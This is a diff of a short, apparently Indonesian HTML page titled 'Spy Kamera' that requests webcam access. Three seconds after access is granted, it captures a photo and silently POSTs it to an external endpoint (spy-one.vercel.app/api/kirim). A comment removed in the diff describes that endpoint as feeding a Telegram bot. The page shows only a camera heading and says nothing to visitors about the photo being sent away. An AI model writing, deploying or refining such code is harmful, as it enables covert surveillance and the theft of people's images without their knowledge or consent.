@@ -1,7 +1,10 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <title>Spy Kamera</title>
+  </head>
   <body>
-    <h3>Kamera Aktif</h3>
+    <h2>Akses Kamera</h2>
     <video id="video" autoplay playsinline width="320" height="240"></video>
     <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
@@ -10,24 +13,26 @@
       const canvas = document.getElementById("canvas");
       const context = canvas.getContext("2d");
 
-      // Aktifkan kamera
-      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-        video.srcObject = stream;
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then((stream) => {
+          video.srcObject = stream;
 
-        // Ambil foto setelah 3 detik
-        setTimeout(() => {
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const imageData = canvas.toDataURL("image/jpeg");
+          setTimeout(() => {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL("image/jpeg");
 
-          // Kirim ke bot Telegram lewat webhook backend
-          fetch("https://spy-one.vercel.app/api/kirim", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ image: imageData })
-          });
-
-        }, 3000); // Delay 3 detik
-      });
+            fetch("https://spy-one.vercel.app/api/kirim", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({ image: imageData }),
+            });
+          }, 3000);
+        })
+        .catch((err) => {
+          alert("Gagal akses kamera: " + err);
+        });
     </script>
   </body>
 </html>
